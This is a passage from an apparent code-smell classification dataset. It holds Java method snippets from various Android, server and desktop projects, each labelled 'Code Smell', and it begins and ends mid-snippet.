      for (int i=0; i < numSharedElements; i++) {
        String sourceName=sources.get(i);
        String targetName=targets.get(i);
        String previousTarget=nameOverrides.remove(targetName);
        if (previousTarget != null) {
          nameOverrides.put(sourceName,previousTarget);
        }
 else {
          nameOverrides.put(sourceName,targetName);
        }
      }
    }
  }
  return nameOverrides;
}",1,Code Smell
"@Override public @Nullable J preVisit(J tree,P p){
  stopAfterPreVisit();
  J j=tree;
  if (tree instanceof JavaSourceFile) {
    JavaSourceFile cu=(JavaSourceFile)tree;
    if (packageName == null || JavaType.Primitive.fromKeyword(fullyQualifiedName) != null) {
      return cu;
    }
    if ((""java.lang"".equals(packageName) && StringUtils.isBlank(member)) || (cu.getPackageDeclaration() != null && packageName.equals(cu.getPackageDeclaration().getExpression().printTrimmed(getCursor())))) {
      return cu;
    }
    if (onlyIfReferenced && !hasReference(cu)) {
      return cu;
    }
    if (cu.getImports().stream().anyMatch(i -> {
      String ending=i.getQualid().getSimpleName();
      if (member == null) {
        return !i.isStatic() && i.getPackageName().equals(packageName) && (ending.equals(typeName) || ""*"".equals(ending));
      }
      return i.isStatic() && i.getTypeName().equals(fullyQualifiedName) && (ending.equals(member) || ""*"".equals(ending));
    }
)) {
      return cu;
    }
    J.Import importToAdd=new J.Import(randomId(),Space.EMPTY,Markers.EMPTY,new JLeftPadded<>(member == null ? Space.EMPTY : Space.SINGLE_SPACE,member != null,Markers.EMPTY),TypeTree.build(fullyQualifiedName + (member == null ? """" : ""."" + member)).withPrefix(Space.SINGLE_SPACE),null);
    List<JRightPadded<J.Import>> imports=new ArrayList<>(cu.getPadding().getImports());
    if (imports.isEmpty() && !cu.getClasses().isEmpty()) {
      if (cu.getPackageDeclaration() == null) {
        Space firstClassPrefix=cu.getClasses().get(0).getPrefix();
        importToAdd=importToAdd.withPrefix(firstClassPrefix.withComments(ListUtils.map(firstClassPrefix.getComments(),comment -> comment instanceof Javadoc ? null : comment)).withWhitespace(""""));
        cu=cu.withClasses(ListUtils.mapFirst(cu.getClasses(),clazz -> clazz.withComments(ListUtils.map(clazz.getComments(),comment -> comment instanceof Javadoc ? comment : null))));
      }
    }
    ImportLayoutStyle layoutStyle=Optional.ofNullable(((SourceFile)cu).getStyle(ImportLayoutStyle.class)).orElse(IntelliJ.importLayout());
    List<JavaType.FullyQualified> classpath=cu.getMarkers().findFirst(JavaSourceSet.class).map(JavaSourceSet::getClasspath).orElse(Collections.emptyList());
    List<JRightPadded<J.Import>> newImports=layoutStyle.addImport(cu.getPadding().getImports(),importToAdd,cu.getPackageDeclaration(),classpath);
    newImports=checkCRLF(cu,newImports);
    cu=cu.getPadding().withImports(newImports);
    JavaSourceFile c=cu;
    cu=cu.withClasses(ListUtils.mapFirst(cu.getClasses(),clazz -> {
      J.ClassDeclaration cl=autoFormat(clazz,clazz.getName(),p,new Cursor(null,c));
      return clazz.withPrefix(clazz.getPrefix().withWhitespace(cl.getPrefix().getWhitespace()));
    }
));
    j=cu;
  }
  return j;
}",1,Code Smell
"private void updateCascadeEnter(float progress,boolean enter){
  int parentTop=(int)(selectAnimatedEmojiDialog.getY() + selectAnimatedEmojiDialog.contentView.getY() + selectAnimatedEmojiDialog.emojiGridView.getY());
  ArrayList<View> animatedViews=null;
  boolean updated=false;
  for (int i=0; i < selectAnimatedEmojiDialog.emojiGridView.getChildCount(); i++) {
    View child=selectAnimatedEmojiDialog.emojiGridView.getChildAt(i);
    if (animatingEnterChild.contains(child)) {
      continue;
    }
    float cy=parentTop + child.getTop() + child.getMeasuredHeight() / 2f;
    if (cy < drawingRect.bottom && cy > drawingRect.top && progress != 0) {
      if (animatedViews == null) {
        animatedViews=new ArrayList<>();
      }
      animatedViews.add(child);
      animatingEnterChild.add(child);
    }
 else {
      setScaleForChild(child,0f);
      updated=true;
    }
  }
  parentTop=(int)(selectAnimatedEmojiDialog.getY() + selectAnimatedEmojiDialog.contentView.getY() + selectAnimatedEmojiDialog.emojiTabs.getY());
  for (int i=0; i < selectAnimatedEmojiDialog.emojiTabs.contentView.getChildCount(); i++) {
    View child=selectAnimatedEmojiDialog.emojiTabs.contentView.getChildAt(i);
    if (animatingEnterChild.contains(child)) {
      continue;
    }
    float cy=parentTop + child.getTop() + child.getMeasuredHeight() / 2f;
    if (cy < drawingRect.bottom && cy > drawingRect.top && progress != 0) {
      if (animatedViews == null) {
        animatedViews=new ArrayList<>();
      }
      animatedViews.add(child);
      animatingEnterChild.add(child);
    }
 else {
      setScaleForChild(child,0f);
      updated=true;
    }
  }
  if (updated) {
    selectAnimatedEmojiDialog.emojiGridViewContainer.invalidate();
  }
  if (animatedViews != null) {
    ValueAnimator valueAnimator=ValueAnimator.ofFloat(0,1f);
    ArrayList<View> finalAnimatedViews=animatedViews;
    valueAnimator.addUpdateListener(animation -> {
      float s=(float)animation.getAnimatedValue();
      for (int i=0; i < finalAnimatedViews.size(); i++) {
        View v=finalAnimatedViews.get(i);
        setScaleForChild(v,s);
      }
      selectAnimatedEmojiDialog.emojiGridViewContainer.invalidate();
    }
);
    animators.add(valueAnimator);
    valueAnimator.addListener(new AnimatorListenerAdapter(){
      @Override public void onAnimationEnd(      Animator animation){
        super.onAnimationEnd(animation);
        animators.remove(valueAnimator);
        checkAnimationEnd(enter);
      }
    }
);
    if (type == TYPE_STICKER_SET_EMOJI) {
      valueAnimator.setDuration(420);
      valueAnimator.setInterpolator(CubicBezierInterpolator.EASE_OUT_QUINT);
    }
 else {
      valueAnimator.setDuration(350);
      valueAnimator.setInterpolator(new OvershootInterpolator(1f));
    }
    valueAnimator.start();
  }
}",1,Code Smell
"@Override public String print(){
  StringBuilder builder=new StringBuilder();
  builder.append(getMethod()).append("" "").append(getPath());
  if (!CollectionUtils.isEmpty(getQueryParameters())) {
    builder.append(""?"").append(getQueryParameters().entrySet().stream().map(e -> e.getKey().concat(""="").concat(e.getValue())).collect(Collectors.joining(""&""))).append(""\n"");
  }
 else {
    builder.append(""\n"");
  }
  for (  Header header : getHeaders()) {
    builder.append(header.getName()).append("": "").append(String.join("","",header.getValue())).append(""\n"");
  }
  if (MultiPart.isMultiPart(getContentType())) {
    MultiPart multiPart=multiPartAsync().toFuture().getNow(null);
    builder.append(""\n"");
    if (multiPart != null) {
      builder.append(""\n"");
      for (      Part part : multiPart.getParts()) {
        builder.append(part).append(""\n"");
      }
    }
 else {
      builder.append(""\n"").append(""<unread multiPart>\n"");
    }
  }
 else   if (getMethod() != HttpMethod.GET && getMethod() != HttpMethod.DELETE) {
    ByteBuf payload=payload().toFuture().getNow(null);
    if (payload == null) {
      return builder.append(""\n"").append(""<unread payload>\n"").toString();
    }
    if (payload.refCnt() == 0) {
      return builder.append(""\n"").append(""<payload released>\n"").toString();
    }
    if (payload.readableBytes() == 0) {
      return builder.toString();
    }
    builder.append(""\n"");
    if (ByteBufUtil.isText(payload,StandardCharsets.UTF_8)) {
      builder.append(payload.toString(StandardCharsets.UTF_8));
    }
 else {
      ByteBufUtil.appendPrettyHexDump(builder,payload);
    }
  }
  return builder.toString();
}",1,Code Smell
"@Override @Transactional(rollbackFor=Exception.class) public void modifyMonitor(Monitor monitor,List<Param> params,String collector) throws RuntimeException {
  long monitorId=monitor.getId();
  Optional<Monitor> queryOption=monitorDao.findById(monitorId);
  if (queryOption.isEmpty()) {
    throw new IllegalArgumentException(""The Monitor "" + monitorId + "" not exists"");
  }
  Monitor preMonitor=queryOption.get();
  if (!preMonitor.getApp().equals(monitor.getApp())) {
    throw new IllegalArgumentException(""Can not modify monitor's app type"");
  }
  List<Tag> tags=monitor.getTags();
  if (tags == null) {
    tags=new LinkedList<>();
    monitor.setTags(tags);
  }
  for (  Tag tag : tags) {
    if (CommonConstants.TAG_MONITOR_NAME.equals(tag.getName())) {
      tag.setTagValue(monitor.getName());
    }
  }
  if (preMonitor.getStatus() != CommonConstants.UN_MANAGE_CODE) {
    Job appDefine=appService.getAppDefine(monitor.getApp());
    if (CommonConstants.PROMETHEUS.equals(monitor.getApp())) {
      appDefine.setApp(CommonConstants.PROMETHEUS_APP_PREFIX + monitor.getName());
    }
    appDefine.setId(preMonitor.getJobId());
    appDefine.setMonitorId(monitorId);
    appDefine.setInterval(monitor.getIntervals());
    appDefine.setCyclic(true);
    appDefine.setTimestamp(System.currentTimeMillis());
    if (params != null) {
      List<Configmap> configmaps=params.stream().map(param -> new Configmap(param.getField(),param.getParamValue(),param.getType())).collect(Collectors.toList());
      appDefine.setConfigmap(configmaps);
    }
    long newJobId;
    if (collector == null) {
      newJobId=collectJobScheduling.updateAsyncCollectJob(appDefine);
    }
 else {
      newJobId=collectJobScheduling.updateAsyncCollectJob(appDefine,collector);
    }
    monitor.setJobId(newJobId);
  }
  try {
    collectorMonitorBindDao.deleteCollectorMonitorBindsByMonitorId(monitorId);
    if (collector != null) {
      CollectorMonitorBind collectorMonitorBind=CollectorMonitorBind.builder().collector(collector).monitorId(monitorId).build();
      collectorMonitorBindDao.save(collectorMonitorBind);
    }
    monitor.setStatus(preMonitor.getStatus());
    monitor.setGmtUpdate(LocalDateTime.now());
    monitorDao.save(monitor);
    if (params != null) {
      paramDao.saveAll(params);
    }
  }
 catch (  Exception e) {
    log.error(e.getMessage(),e);
    collectJobScheduling.cancelAsyncCollectJob(monitor.getJobId());
    throw new MonitorDatabaseException(e.getMessage());
  }
}
",1,Code Smell
"private Object convertJavaObject(Object value,TypeInfo<?> typeInfo){
  if (Objects.isNull(value)) {
    return null;
  }
  if (typeInfo instanceof MapTypeInfo) {
    if (!(value instanceof Map)) {
      throw BitSailException.asBitSailException(CommonErrorCode.CONVERT_NOT_SUPPORT,String.format(""Type %s can't convert to map type."",value.getClass()));
    }
    MapTypeInfo<?,?> mapTypeInfo=(MapTypeInfo<?,?>)typeInfo;
    Map<?,?> origin=(Map<?,?>)value;
    Map<Object,Object> converted=Maps.newHashMap();
    for (    Object key : origin.keySet()) {
      converted.put(convertJavaObject(key,mapTypeInfo.getKeyTypeInfo()),convertJavaObject(origin.get(key),mapTypeInfo.getValueTypeInfo()));
    }
    return converted;
  }
 else   if (typeInfo instanceof ListTypeInfo) {
    if (!(value instanceof List)) {
      throw BitSailException.asBitSailException(CommonErrorCode.CONVERT_NOT_SUPPORT,String.format(""Type %s can't convert to list type."",value.getClass()));
    }
    ListTypeInfo<?> listTypeInfo=(ListTypeInfo<?>)typeInfo;
    List<?> origin=(List<?>)value;
    List<Object> converted=Lists.newArrayList();
    for (    Object key : origin) {
      converted.add(convertJavaObject(key,listTypeInfo.getElementTypeInfo()));
    }
    return converted;
  }
 else {
    return convertPrimitiveObject(value,typeInfo);
  }
}
",1,Code Smell
"@Override public boolean onCustomButtonPressed(){
  int row=layoutManager.findFirstVisibleItemPosition();
  int top=Integer.MAX_VALUE;
  RecyclerListView.Holder holder=(RecyclerListView.Holder)listView.findViewHolderForAdapterPosition(row);
  if (holder != null) {
    top=holder.itemView.getTop();
  }
  int prevIndex=selectedStickerSetIndex;
  if (isSelected) {
    selectedStickerSet=null;
    removeStickerSet=true;
  }
 else {
    selectedStickerSet=stickerSet;
    removeStickerSet=false;
  }
  if (isEmoji) {
    AndroidUtilities.runOnUIThread(() -> BulletinFactory.of(GroupStickersActivity.this).createSimpleBulletin(R.raw.done,LocaleController.getString(R.string.GroupsEmojiPackUpdated)).show(),350);
  }
  updateSelectedStickerSetIndex();
  updateCurrentPackVisibility(selectedStickerSet,true);
  if (prevIndex != -1) {
    boolean found=false;
    if (!searching) {
      for (int i=0; i < listView.getChildCount(); i++) {
        View ch=listView.getChildAt(i);
        if (listView.getChildViewHolder(ch).getAdapterPosition() == stickersStartRow + prevIndex) {
          ((StickerSetCell)ch).setChecked(false,true);
          found=true;
          break;
        }
      }
    }
    if (!found) {
      listAdapter.notifyItemChanged(prevIndex);
    }
  }
  if (selectedStickerSetIndex != -1) {
    boolean found=false;
    if (!searching) {
      for (int i=0; i < listView.getChildCount(); i++) {
        View ch=listView.getChildAt(i);
        if (listView.getChildViewHolder(ch).getAdapterPosition() == stickersStartRow + selectedStickerSetIndex) {
          ((StickerSetCell)ch).setChecked(true,true);
          found=true;
          break;
        }
      }
    }
    if (!found) {
      listAdapter.notifyItemChanged(selectedStickerSetIndex);
    }
  }
  if (top != Integer.MAX_VALUE && !isEmoji) {
    layoutManager.scrollToPositionWithOffset(row + 1,top);
  }
  if (searching) {
    searchItem.setSearchFieldText("""",false);
    actionBar.closeSearchField(true);
  }
  return true;
}",1,Code Smell
"@Override public boolean onMenuItemSelected(@NonNull MenuItem item){
  int id=item.getItemId();
  ListView lv=requireActivity().findViewById(R.id.listview);
  if (lv == null)   return false;
  if (id == R.id.action_export) {
    if (mList.isEmpty())     Utils.showToastLong(requireContext(),R.string.no_rules_to_export);
 else     startExport();
    return true;
  }
 else   if (id == R.id.action_import) {
    startImport();
    return true;
  }
 else   if (id == R.id.copy_to_clipboard) {
    String contents=Utils.adapter2Text((ListEditAdapter)lv.getAdapter());
    Utils.copyToClipboard(requireContext(),contents);
    return true;
  }
 else   if (id == R.id.share) {
    String contents=Utils.adapter2Text((ListEditAdapter)lv.getAdapter());
    Utils.shareText(requireContext(),getString(mListInfo.getTitle()),contents);
    return true;
  }
 else   if (id == R.id.show_hint) {
    Utils.showHelpDialog(requireContext(),mListInfo.getHelpString());
    return true;
  }
 else   if (id == R.id.add_ip) {
    showAddIpRule();
    return true;
  }
 else   if (id == R.id.add_proto) {
    showAddProtoRule();
    return true;
  }
 else   if (id == R.id.add_host) {
    showAddHostRule();
    return true;
  }
 else   if (id == R.id.add_app) {
    showAddAppRule();
    return true;
  }
 else   if (id == R.id.add_country) {
    showAddCountryRule();
    return true;
  }
  return false;
}",1,Code Smell
"/** 
 * Installs a key listener into the application that allows enabling and disabling the UI inspector with the given keystroke (e.g. ""ctrl shift alt X"").
 * @param activationKeys a keystroke (e.g. ""ctrl shift alt X""), or {@code null} to use ""ctrl shift alt X""
 */
public static void install(String activationKeys){
  if (activationKeys == null)   activationKeys=""ctrl shift alt X"";
  KeyStroke keyStroke=KeyStroke.getKeyStroke(activationKeys);
  Toolkit.getDefaultToolkit().addAWTEventListener(e -> {
    if (e.getID() == KeyEvent.KEY_RELEASED && ((KeyEvent)e).getKeyCode() == keyStroke.getKeyCode() && (((KeyEvent)e).getModifiersEx() & KEY_MODIFIERS_MASK) == (keyStroke.getModifiers() & KEY_MODIFIERS_MASK)) {
      Window activeWindow=KeyboardFocusManager.getCurrentKeyboardFocusManager().getActiveWindow();
      RootPaneContainer rootPaneContainer=null;
      if (activeWindow instanceof RootPaneContainer)       rootPaneContainer=(RootPaneContainer)activeWindow;
 else {
        for (        Component child : activeWindow.getComponents()) {
          if (child instanceof RootPaneContainer) {
            rootPaneContainer=(RootPaneContainer)child;
            break;
          }
        }
      }
      if (rootPaneContainer != null) {
        JRootPane rootPane=rootPaneContainer.getRootPane();
        FlatInspector inspector=(FlatInspector)rootPane.getClientProperty(FlatInspector.class);
        if (inspector == null) {
          inspector=new FlatInspector(rootPane);
          rootPane.putClientProperty(FlatInspector.class,inspector);
          inspector.setEnabled(true);
        }
 else {
          inspector.setEnabled(false);
          rootPane.putClientProperty(FlatInspector.class,null);
        }
      }
    }
  }
,AWTEvent.KEY_EVENT_MASK);
}
",1,Code Smell
"private void absXml(AbsXml data,String sourceKey){
  if (data.movie != null && data.movie.videoList != null) {
    for (    Movie.Video video : data.movie.videoList) {
      if (video.urlBean != null && video.urlBean.infoList != null) {
        for (        Movie.Video.UrlBean.UrlInfo urlInfo : video.urlBean.infoList) {
          String[] str=null;
          if (urlInfo.urls.contains(""#"")) {
            str=urlInfo.urls.split(""#"");
          }
 else {
            str=new String[]{urlInfo.urls};
          }
          List<Movie.Video.UrlBean.UrlInfo.InfoBean> infoBeanList=new ArrayList<>();
          for (          String s : str) {
            if (s.contains(""$"")) {
              String[] ss=s.split(""\\$"");
              if (ss.length >= 2) {
                infoBeanList.add(new Movie.Video.UrlBean.UrlInfo.InfoBean(ss[0],ss[1]));
              }
            }
          }
          urlInfo.beanList=infoBeanList;
        }
      }
      video.sourceKey=sourceKey;
    }
  }
}",1,Code Smell
"private void addEntityType(WTable table,WCheckbox tableCheckbox,EntityType<?> entityType){
  table.add(theme.label(Names.get(entityType)));
  WCheckbox a=table.add(theme.checkbox(setting.get().contains(entityType))).expandCellX().right().widget();
  a.action=() -> {
    if (a.checked) {
      setting.get().add(entityType);
switch (entityType.getSpawnGroup()) {
case CREATURE:
{
          if (hasAnimal == 0)           tableCheckbox.checked=true;
          hasAnimal++;
        }
case WATER_AMBIENT:
{
        if (hasWaterAnimal == 0)         tableCheckbox.checked=true;
        hasWaterAnimal++;
      }
case MONSTER:
{
      if (hasMonster == 0)       tableCheckbox.checked=true;
      hasMonster++;
    }
case AMBIENT:
{
    if (hasAmbient == 0)     tableCheckbox.checked=true;
    hasAmbient++;
  }
case MISC:
{
  if (hasMisc == 0)   tableCheckbox.checked=true;
  hasMisc++;
}
}
}
 else {
if (setting.get().remove(entityType)) {
switch (entityType.getSpawnGroup()) {
case CREATURE:
{
  hasAnimal--;
  if (hasAnimal == 0)   tableCheckbox.checked=false;
}
case WATER_AMBIENT:
{
hasWaterAnimal--;
if (hasWaterAnimal == 0) tableCheckbox.checked=false;
}
case MONSTER:
{
hasMonster--;
if (hasMonster == 0) tableCheckbox.checked=false;
}
case AMBIENT:
{
hasAmbient--;
if (hasAmbient == 0) tableCheckbox.checked=false;
}
case MISC:
{
hasMisc--;
if (hasMisc == 0) tableCheckbox.checked=false;
}
}
}
}
setting.onChanged();
}
;
table.row();
}",1,Code Smell
"@Override public void didReceivedNotification(int id,int account,Object... args){
  if (id == NotificationCenter.proxyChangedByRotation) {
    listView.forAllChild(view -> {
      RecyclerView.ViewHolder holder=listView.getChildViewHolder(view);
      if (holder.itemView instanceof TextDetailProxyCell) {
        TextDetailProxyCell cell=(TextDetailProxyCell)holder.itemView;
        cell.setChecked(cell.currentInfo == SharedConfig.currentProxy);
        cell.updateStatus();
      }
    }
);
    updateRows(false);
  }
 else   if (id == NotificationCenter.proxySettingsChanged) {
    updateRows(true);
  }
 else   if (id == NotificationCenter.didUpdateConnectionState) {
    int state=ConnectionsManager.getInstance(account).getConnectionState();
    if (currentConnectionState != state) {
      currentConnectionState=state;
      if (listView != null && SharedConfig.currentProxy != null) {
        int idx=proxyList.indexOf(SharedConfig.currentProxy);
        if (idx >= 0) {
          RecyclerListView.Holder holder=(RecyclerListView.Holder)listView.findViewHolderForAdapterPosition(idx + proxyStartRow);
          if (holder != null) {
            TextDetailProxyCell cell=(TextDetailProxyCell)holder.itemView;
            cell.updateStatus();
          }
        }
        if (currentConnectionState == ConnectionsManager.ConnectionStateConnected) {
          updateRows(true);
        }
      }
    }
  }
 else   if (id == NotificationCenter.proxyCheckDone) {
    if (listView != null) {
      SharedConfig.ProxyInfo proxyInfo=(SharedConfig.ProxyInfo)args[0];
      int idx=proxyList.indexOf(proxyInfo);
      if (idx >= 0) {
        RecyclerListView.Holder holder=(RecyclerListView.Holder)listView.findViewHolderForAdapterPosition(idx + proxyStartRow);
        if (holder != null) {
          TextDetailProxyCell cell=(TextDetailProxyCell)holder.itemView;
          cell.updateStatus();
        }
      }
      boolean checking=false;
      if (!wasCheckedAllList) {
        for (        SharedConfig.ProxyInfo info : proxyList) {
          if (info.checking || info.availableCheckTime == 0) {
            checking=true;
            break;
          }
        }
        if (!checking) {
          wasCheckedAllList=true;
        }
      }
      if (!checking) {
        updateRows(true);
      }
    }
  }
}",1,Code Smell
"public void setMultipleDetails(FileInfo[] files){
  this.details=files;
  boolean hasAnyDir=false;
  long totalSize=0;
  for (  FileInfo file : files) {
    if (file.getType() == FileType.DirLink || file.getType() == FileType.Directory) {
      hasAnyDir=true;
      break;
    }
  }
  if (!hasAnyDir) {
    for (    FileInfo file : files) {
      if (file.getType() == FileType.File || file.getType() == FileType.FileLink) {
        totalSize+=file.getSize();
      }
    }
    txtSize.setText(FormatUtils.humanReadableByteCount(totalSize,true));
  }
  btnCalculate1.setEnabled(hasAnyDir);
  int fc=0, dc=0;
  for (  FileInfo f : files) {
    if (f.getType() == FileType.Directory || f.getType() == FileType.DirLink) {
      dc++;
    }
 else {
      fc++;
    }
  }
  txtFileCount.setText(fc + "" files, "" + dc+ "" folders"");
}",1,Code Smell
"protected String parseStringValue(String value,PlaceholderResolver placeholderResolver,Set<String> visitedPlaceholders){
  StringBuilder result=new StringBuilder(value);
  int startIndex=value.indexOf(this.placeholderPrefix);
  while (startIndex != -1) {
    int endIndex=findPlaceholderEndIndex(result,startIndex);
    if (endIndex != -1) {
      String placeholder=result.substring(startIndex + this.placeholderPrefix.length(),endIndex);
      String originalPlaceholder=placeholder;
      if (!visitedPlaceholders.add(originalPlaceholder)) {
        throw new IllegalArgumentException(""Circular placeholder reference '"" + originalPlaceholder + ""' in property definitions"");
      }
      placeholder=parseStringValue(placeholder,placeholderResolver,visitedPlaceholders);
      String propVal=placeholderResolver.resolvePlaceholder(placeholder);
      if (propVal == null && this.valueSeparator != null) {
        int separatorIndex=placeholder.indexOf(this.valueSeparator);
        if (separatorIndex != -1) {
          String actualPlaceholder=placeholder.substring(0,separatorIndex);
          String defaultValue=placeholder.substring(separatorIndex + this.valueSeparator.length());
          propVal=placeholderResolver.resolvePlaceholder(actualPlaceholder);
          if (propVal == null) {
            propVal=defaultValue;
          }
        }
      }
      if (propVal != null) {
        propVal=parseStringValue(propVal,placeholderResolver,visitedPlaceholders);
        result.replace(startIndex,endIndex + this.placeholderSuffix.length(),propVal);
        if (log.isTraceEnabled()) {
          log.trace(""Resolved placeholder '"" + placeholder + ""'"");
        }
        startIndex=result.indexOf(this.placeholderPrefix,startIndex + propVal.length());
      }
 else       if (this.ignoreUnresolvablePlaceholders) {
        startIndex=result.indexOf(this.placeholderPrefix,endIndex + this.placeholderSuffix.length());
      }
 else {
        throw new IllegalArgumentException(""Could not resolve placeholder '"" + placeholder + ""'""+ "" in value \""""+ value+ ""\"""");
      }
      visitedPlaceholders.remove(originalPlaceholder);
    }
 else {
      startIndex=-1;
    }
  }
  return result.toString();
}",1,Code Smell
"@Override public Task<Image> createTask(){
  return new Task<Image>(){
    @Override protected Image call() throws Exception {
      try {
        if (cam == null) {
          List<Webcam> webcams=Webcam.getWebcams(1,TimeUnit.MINUTES);
          if (webcams.isEmpty()) {
            throw new UnsupportedOperationException(""No camera available."");
          }
          cam=webcams.get(0);
          if (device != null) {
            for (            Webcam webcam : webcams) {
              if (webcam.getDevice().getName().equals(device.getName())) {
                cam=webcam;
              }
            }
          }
 else           if (Config.get().getWebcamDevice() != null) {
            for (            Webcam webcam : webcams) {
              if (webcam.getDevice().getName().equals(Config.get().getWebcamDevice())) {
                cam=webcam;
              }
            }
          }
          device=cam.getDevice();
          cam.setCustomViewSizes(resolution.getSize());
          cam.setViewSize(resolution.getSize());
          if (!Arrays.asList(cam.getWebcamListeners()).contains(listener)) {
            cam.addWebcamListener(listener);
          }
          opening.set(true);
          cam.open(true,delayCalculator);
          opening.set(false);
        }
        BufferedImage originalImage=cam.getImage();
        if (originalImage == null) {
          return null;
        }
        CroppedDimension cropped=getCroppedDimension(originalImage);
        BufferedImage croppedImage=originalImage.getSubimage(cropped.x,cropped.y,cropped.length,cropped.length);
        BufferedImage framedImage=getFramedImage(originalImage,cropped);
        Image image=SwingFXUtils.toFXImage(framedImage,null);
        updateValue(image);
        if (System.currentTimeMillis() > (lastQrSampleTime + QR_SAMPLE_PERIOD_MILLIS)) {
          readQR(originalImage,croppedImage);
          lastQrSampleTime=System.currentTimeMillis();
        }
        return image;
      }
  finally {
        opening.set(false);
      }
    }
  }
;
}",1,Code Smell
"public void updateMessageThumbs(){
  if (message == null) {
    return;
  }
  String restrictionReason=MessagesController.getRestrictionReason(message.messageOwner.restriction_reason);
  if (NekoConfig.mediaPreview.Bool() && groupMessages != null && groupMessages.size() > 1 && TextUtils.isEmpty(restrictionReason) && currentDialogFolderId == 0 && encryptedChat == null) {
    thumbsCount=0;
    hasVideoThumb=false;
    Collections.sort(groupMessages,Comparator.comparingInt(MessageObject::getId));
    for (int i=0; i < Math.min(3,groupMessages.size()); ++i) {
      MessageObject message=groupMessages.get(i);
      if (message != null && !message.needDrawBluredPreview() && (message.isPhoto() || message.isNewGif() || message.isVideo()|| message.isRoundVideo()|| message.isStoryMedia())) {
        String type=message.isWebpage() ? message.messageOwner.media.webpage.type : null;
        if (!(""app"".equals(type) || ""profile"".equals(type) || ""article"".equals(type)|| type != null && type.startsWith(""telegram_""))) {
          setThumb(i,message);
        }
      }
    }
  }
 else   if (message != null && currentDialogFolderId == 0) {
    thumbsCount=0;
    hasVideoThumb=false;
    if (!message.needDrawBluredPreview() && (message.isPhoto() || message.isNewGif() || message.isVideo()|| message.isRoundVideo()|| message.isStoryMedia())) {
      String type=message.isWebpage() ? message.messageOwner.media.webpage.type : null;
      if (!(""app"".equals(type) || ""profile"".equals(type) || ""article"".equals(type)|| type != null && type.startsWith(""telegram_""))) {
        setThumb(0,message);
      }
    }
  }
}",1,Code Smell
"@Nullable private static HashSet<DexMethodDescriptor> e(int i,DexDeobfReport rep){
  ClassLoader loader=Initiator.getHostClassLoader();
  int record=0;
  int[] qf=d(i);
  byte[][] keys=b(i);
  boolean check=p(i);
  if (qf != null) {
    for (    int dexi : qf) {
      record|=1 << dexi;
      try {
        for (        byte[] k : keys) {
          HashSet<DexMethodDescriptor> ret=findMethodsByConstString(k,dexi,loader);
          if (ret != null && ret.size() > 0) {
            if (check) {
              DexMethodDescriptor m=a(i,ret,rep);
              if (m != null) {
                ret.clear();
                ret.add(m);
                return ret;
              }
            }
 else {
              return ret;
            }
          }
        }
      }
 catch (      FileNotFoundException ignored) {
      }
    }
  }
  int dexi=1;
  while (true) {
    if ((record & (1 << dexi)) != 0) {
      dexi++;
      continue;
    }
    try {
      for (      byte[] k : keys) {
        HashSet<DexMethodDescriptor> ret=findMethodsByConstString(k,dexi,loader);
        if (ret != null && ret.size() > 0) {
          if (check) {
            DexMethodDescriptor m=a(i,ret,rep);
            if (m != null) {
              ret.clear();
              ret.add(m);
              return ret;
            }
          }
 else {
            return ret;
          }
        }
      }
    }
 catch (    FileNotFoundException ignored) {
      return null;
    }
    dexi++;
  }
}",1,Code Smell
"public static <T>T toObject(Row row,Class<T> objectClass){
  return toObject(row,objectClass,0);
}
public static <T>T toObject(Row row,Class<T> objectClass,int index){
  T instance=ClassUtil.newInstance(objectClass);
  Map<String,Method> classSetters=getSetterMethods(objectClass);
  Set<String> rowKeys=row.keySet();
  classSetters.forEach((property,setter) -> {
    try {
      if (index <= 0) {
        for (        String rowKey : rowKeys) {
          if (property.equalsIgnoreCase(rowKey)) {
            Object rowValue=row.get(rowKey);
            Object value=ConvertUtil.convert(rowValue,setter.getParameterTypes()[0],true);
            setter.invoke(instance,value);
          }
        }
      }
 else {
        for (int i=index; i >= 0; i--) {
          String newProperty=i <= 0 ? property : property + INDEX_SEPARATOR + i;
          boolean fillValue=false;
          for (          String rowKey : rowKeys) {
            if (newProperty.equalsIgnoreCase(rowKey)) {
              Object rowValue=row.get(rowKey);
              Object value=ConvertUtil.convert(rowValue,setter.getParameterTypes()[0],true);
              setter.invoke(instance,value);
              fillValue=true;
              break;
            }
          }
          if (fillValue) {
            break;
          }
        }
      }
    }
 catch (    Exception e) {
      throw new RuntimeException(""Can not invoke method: "" + setter);
    }
  }
);
  return instance;
}",1,Code Smell
"public static EmojiThemes createPreviewCustom(int currentAccount){
  EmojiThemes themeItem=new EmojiThemes(currentAccount);
  themeItem.emoji=""\uD83C\uDFA8"";
  SharedPreferences preferences=ApplicationLoader.applicationContext.getSharedPreferences(""themeconfig"",Activity.MODE_PRIVATE);
  String lastDayCustomTheme=preferences.getString(""lastDayCustomTheme"",null);
  int dayAccentId=preferences.getInt(""lastDayCustomThemeAccentId"",-1);
  if (lastDayCustomTheme == null || Theme.getTheme(lastDayCustomTheme) == null) {
    lastDayCustomTheme=preferences.getString(""lastDayTheme"",""Blue"");
    Theme.ThemeInfo themeInfo=Theme.getTheme(lastDayCustomTheme);
    if (themeInfo == null) {
      lastDayCustomTheme=""Blue"";
      dayAccentId=99;
    }
 else {
      dayAccentId=themeInfo.currentAccentId;
    }
    preferences.edit().putString(""lastDayCustomTheme"",lastDayCustomTheme).apply();
  }
 else {
    if (dayAccentId == -1) {
      dayAccentId=Theme.getTheme(lastDayCustomTheme).lastAccentId;
    }
  }
  if (dayAccentId == -1) {
    lastDayCustomTheme=""Blue"";
    dayAccentId=99;
  }
  String lastDarkCustomTheme=preferences.getString(""lastDarkCustomTheme"",null);
  int darkAccentId=preferences.getInt(""lastDarkCustomThemeAccentId"",-1);
  if (lastDarkCustomTheme == null || Theme.getTheme(lastDarkCustomTheme) == null) {
    lastDarkCustomTheme=preferences.getString(""lastDarkTheme"",""Dark Blue"");
    Theme.ThemeInfo themeInfo=Theme.getTheme(lastDarkCustomTheme);
    if (themeInfo == null) {
      lastDarkCustomTheme=""Dark Blue"";
      darkAccentId=0;
    }
 else {
      darkAccentId=themeInfo.currentAccentId;
    }
    preferences.edit().putString(""lastDarkCustomTheme"",lastDarkCustomTheme).apply();
  }
 else {
    if (darkAccentId == -1) {
      darkAccentId=Theme.getTheme(lastDayCustomTheme).lastAccentId;
    }
  }
  if (darkAccentId == -1) {
    lastDarkCustomTheme=""Dark Blue"";
    darkAccentId=0;
  }
  ThemeItem lightTheme=new ThemeItem();
  lightTheme.themeInfo=Theme.getTheme(lastDayCustomTheme);
  lightTheme.accentId=dayAccentId;
  themeItem.items.add(lightTheme);
  themeItem.items.add(null);
  ThemeItem darkTheme=new ThemeItem();
  darkTheme.themeInfo=Theme.getTheme(lastDarkCustomTheme);
